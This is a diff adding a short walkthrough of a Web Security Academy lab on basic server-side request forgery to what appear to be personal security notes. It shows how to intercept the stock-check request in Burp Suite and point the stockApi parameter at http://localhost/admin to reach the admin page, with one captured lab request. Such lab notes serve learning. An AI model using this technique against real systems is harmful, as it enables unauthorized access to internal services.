@@ -193,12 +193,33 @@ It is an application protocol used over an IP network to manage and access the d
  
  
  
+ ## 1. Basic SSRF against the local server
+ 
+ Browse to /admin and observe that you can't directly access the admin page. 
+ 
+ Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater. 
+ 
+ Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface.
  
  
- 
- 
- 
- 
+      POST /product/stock HTTP/1.1
+Host: 0ae1000c0480168dc06de9f6003c0073.web-security-academy.net
+Cookie: session=EPwP4cphLv9LiB2QtMzpx9h6mqSw7JAB
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://0ae1000c0480168dc06de9f6003c0073.web-security-academy.net/product?productId=1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://0ae1000c0480168dc06de9f6003c0073.web-security-academy.net
+Content-Length: 107
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D3
  
  
  
